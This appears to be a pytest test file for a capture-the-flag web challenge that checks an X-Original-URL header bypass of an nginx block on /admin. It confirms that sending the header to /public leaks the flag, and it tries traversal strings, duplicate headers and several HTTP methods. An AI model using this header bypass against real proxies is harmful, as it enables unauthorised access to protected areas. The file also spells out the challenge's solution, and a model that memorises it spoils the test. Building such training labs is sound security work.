import pytest
import requests
import json
from pathlib import Path

def _load_flag(challenge_num):
    """Load flag from the challenge's .env file"""
    env_path = Path(__file__).parent.parent / f"challenge-{challenge_num}" / ".env"
    with open(env_path) as f:
        for line in f:
            if line.startswith("FLAG="):
                return line.split("=", 1)[1].strip()
    raise ValueError(f"FLAG not found in {env_path}")

class TestChallenge4:
    """Tests for Challenge 4: X-Original-URL path bypass"""
    
    def test_index_endpoint(self, challenge_4_service):
        """Test that the index endpoint returns expected message"""
        response = requests.get(f"{challenge_4_service}/")
        assert response.status_code == 200
        assert "Public area available at /public" in response.text
        assert "Admin area available at /admin" in response.text
        assert "blocked by reverse proxy" in response.text
    
    def test_debug_endpoint(self, challenge_4_service):
        """Test that the debug endpoint shows request information"""
        headers = {"User-Agent": "Test-Agent", "Custom-Header": "test-value"}
        response = requests.get(f"{challenge_4_service}/debug", headers=headers)
        assert response.status_code == 200
        assert "User-Agent: Test-Agent" in response.text
        assert "Custom-Header: test-value" in response.text
        assert "Request Path: /debug" in response.text
    
    def test_debug_shows_original_url_header(self, challenge_4_service):
        """Test that debug endpoint shows X-Original-URL when present"""
        headers = {"X-Original-URL": "/some/original/path"}
        response = requests.get(f"{challenge_4_service}/debug", headers=headers)
        assert response.status_code == 200
        assert "X-Original-URL: /some/original/path" in response.text
    
    def test_public_area_accessible(self, challenge_4_service):
        """Test that public area is accessible"""
        response = requests.get(f"{challenge_4_service}/public")
        assert response.status_code == 200
        assert "This is the public area" in response.text
    
    def test_public_subpaths_accessible(self, challenge_4_service):
        """Test that public subpaths are accessible"""
        response = requests.get(f"{challenge_4_service}/public")
        assert response.status_code == 200
        assert "This is the public area" in response.text
    
    def test_admin_area_blocked(self, challenge_4_service):
        """Test that admin area is blocked by nginx"""
        response = requests.get(f"{challenge_4_service}/admin")
        assert response.status_code == 403
        assert "forbidden" in response.text.lower()
    
    def test_admin_flag_blocked(self, challenge_4_service):
        """Test that admin flag endpoint is blocked by nginx"""
        response = requests.get(f"{challenge_4_service}/admin")
        assert response.status_code == 403
        assert "forbidden" in response.text.lower()
    
    def test_admin_subpaths_blocked(self, challenge_4_service):
        """Test that various admin subpaths are blocked"""
        admin_paths = ["/admin/users", "/admin/settings", "/admin/config"]
        
        for path in admin_paths:
            response = requests.get(f"{challenge_4_service}{path}")
            assert response.status_code == 403, f"Path {path} should be blocked"
    
    def test_original_url_bypass_admin_flag(self, challenge_4_service):
        """Test successful bypass using X-Original-URL header to access admin flag"""
        headers = {"X-Original-URL": "/admin"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(4) in data["flag"]
        assert "Accessed via X-Original-URL header bypass" in data["message"]
    
    def test_original_url_bypass_admin_area(self, challenge_4_service):
        """Test bypass to access other admin areas"""
        headers = {"X-Original-URL": "/admin"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert "Accessed via X-Original-URL header bypass" in data["message"]
    
    def test_original_url_header_case_insensitive(self, challenge_4_service):
        """Test that header name is case insensitive"""
        headers = {"x-original-url": "/admin"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(4) in data["flag"]
    
    def test_original_url_with_various_public_paths(self, challenge_4_service):
        """Test that bypass works from various public paths"""
        public_paths = ["/anything", "/anything/docs", "/anything/info"]
        
        for pub_path in public_paths:
            headers = {"X-Original-URL": "/admin"}
            response = requests.get(f"{challenge_4_service}{pub_path}", headers=headers)
            if response.status_code == 200:
                # Some paths might route to catch-all
                try:
                    data = response.json()
                    if "flag" in data:
                        assert _load_flag(4) in data["flag"]
                        break
                except:
                    # Not JSON response, check if it's the admin content
                    if "admin" in response.text.lower():
                        assert "Admin area accessed via X-Original-URL" in response.text
                        break
    
    def test_original_url_with_query_parameters(self, challenge_4_service):
        """Test X-Original-URL with query parameters"""
        headers = {"X-Original-URL": "/admin?param=value"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(4) in data["flag"]
    
    def test_original_url_with_fragments(self, challenge_4_service):
        """Test X-Original-URL with URL fragments"""
        headers = {"X-Original-URL": "/admin#section"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(4) in data["flag"]
    
    def test_original_url_absolute_url(self, challenge_4_service):
        """Test X-Original-URL with absolute URL"""
        headers = {"X-Original-URL": "http://example.com/admin"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        # Should process as relative path /admin since absolute URLs may not work
        if "application/json" in response.headers.get("content-type", ""):
            data = response.json()
            assert _load_flag(4) in data["flag"]
        else:
            assert "bypass" in response.text
    
    def test_original_url_to_public_area(self, challenge_4_service):
        """Test X-Original-URL pointing to public area"""
        headers = {"X-Original-URL": "/debug"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        assert "Request Headers" in response.text
    
    def test_missing_original_url_header(self, challenge_4_service):
        """Test behavior when X-Original-URL header is missing"""
        response = requests.get(f"{challenge_4_service}/public")
        assert response.status_code == 200
        assert "This is the public area" in response.text
    
    def test_empty_original_url_header(self, challenge_4_service):
        """Test behavior with empty X-Original-URL header"""
        headers = {"X-Original-URL": ""}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200  # Empty header is ignored, normal /public response
        assert "This is the public area" in response.text
    
    def test_malformed_original_url_header(self, challenge_4_service):
        """Test behavior with malformed X-Original-URL header"""
        headers = {"X-Original-URL": "not-a-valid-url"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        # Should handle gracefully, might return 404 or process as relative path
        assert response.status_code in [200, 404]
    
    def test_path_traversal_attempts(self, challenge_4_service):
        """Test path traversal attempts via X-Original-URL"""
        traversal_attempts = [
            "/admin/../admin/flag",
            "/anything/../admin/flag", 
            "//admin/flag",
            "/admin/./flag"
        ]
        
        for attempt in traversal_attempts:
            headers = {"X-Original-URL": attempt}
            response = requests.get(f"{challenge_4_service}/public", headers=headers)
            # These should either work (demonstrating vulnerability) or be handled safely
            assert response.status_code in [200, 404, 400]
    
    def test_multiple_original_url_headers(self, challenge_4_service):
        """Test behavior with multiple X-Original-URL headers"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        http = urllib3.PoolManager()
        
        # Send request with duplicate X-Original-URL headers
        headers = HTTPHeaderDict([
            ('X-Original-URL', '/anything/test'),
            ('X-Original-URL', '/admin/flag')
        ])
        response = http.request('GET', f"{challenge_4_service}/public", headers=headers)
        
        # Flask typically uses the first header value or combines them
        assert response.status in [200, 404]
    
    def test_post_method_with_original_url(self, challenge_4_service):
        """Test POST method with X-Original-URL header"""
        headers = {"X-Original-URL": "/admin"}
        response = requests.post(f"{challenge_4_service}/public", headers=headers)
        # POST method not allowed on /public, so expect 405
        assert response.status_code == 405
    
    def test_different_http_methods(self, challenge_4_service):
        """Test various HTTP methods with X-Original-URL bypass"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        headers = {"X-Original-URL": "/admin"}
        
        for method in methods:
            response = requests.request(method, f"{challenge_4_service}/public", headers=headers)
            if response.status_code == 200:
                try:
                    data = response.json()
                    assert _load_flag(4) in data["flag"]
                    break  # Found working method
                except:
                    continue
    
    def test_challenge_solution_verification(self, challenge_4_service):
        """Verify the exact solution from SOLUTION.md works"""
        headers = {"X-Original-URL": "/admin"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(4) in data["flag"]
        assert "Accessed via X-Original-URL header bypass" in data["message"]
    
    def test_security_implications(self, challenge_4_service):
        """Test security implications of the vulnerability"""
        # Verify nginx blocks direct access
        response = requests.get(f"{challenge_4_service}/admin")
        assert response.status_code == 403
        
        # But X-Original-URL bypasses the restriction
        headers = {"X-Original-URL": "/admin"}
        response = requests.get(f"{challenge_4_service}/public", headers=headers)
        assert response.status_code == 200
        
        # This demonstrates the path-based security control bypass